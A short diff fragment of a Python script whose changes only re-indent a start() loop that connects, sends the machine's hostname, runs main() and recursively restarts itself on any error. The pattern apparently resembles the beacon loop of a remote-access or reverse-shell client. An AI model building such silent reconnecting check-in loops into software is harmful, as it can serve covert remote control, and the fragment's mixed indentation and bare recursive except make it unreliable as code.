@@ -106,12 +106,12 @@ def main():
 def start():
     while True:
 		try:
-			connect()
-			send(socket.gethostname())
-			main()
+	    	connect()
+	    	send(socket.gethostname())
+	    	main()
 		except:
-			start()
+	    	start()
 
 
 if __name__ == "__main__":
-	start()
+    start()
